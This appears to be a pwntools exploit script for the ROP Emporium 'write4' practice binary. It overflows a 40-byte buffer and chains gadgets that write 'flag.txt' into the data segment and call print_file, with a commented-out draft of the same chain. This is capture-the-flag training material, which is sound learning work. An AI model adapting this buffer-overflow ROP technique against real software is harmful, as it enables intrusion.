from pwn import *

ex = "./write4"
elf = ELF(ex)
p = process(ex)

offset = 40
buffer = b'A' * offset

pop_registers = p64(0x0000000000400690)
data_seg = p64(0x00601028)
flag_string = b'flag.txt'

mov = p64(0x0000000000400628)

pop_rdi = p64(0x0000000000400693)

call_printfile = p64(0x00400510)

msg = buffer + pop_registers + data_seg + flag_string + mov + pop_rdi + data_seg + call_printfile


# data_seg = 0x00601028 

# print_file = 0x400510

# # RIP offset is at 40
# rop = b"A" * 40

# # First gadget to initialize r14 and r15
# pop_r14_r15 = 0x0000000000400690 # pop r14 ; pop r15 ; ret
# rop += p64(pop_r14_r15)
# rop += p64(data_seg)
# rop += b"flag.txt"
# #write to memory
# mov_r15_to_r14 = 0x0000000000400628 # mov qword ptr [r14], r15 ; ret
# rop += p64(mov_r15_to_r14)
# # Call print_file
# pop_rdi = 0x0000000000400693 # pop rdi ; ret
# rop += p64(pop_rdi)
# rop += p64(data_seg)
# rop += p64(print_file)


p.sendline(msg)

p.interactive()
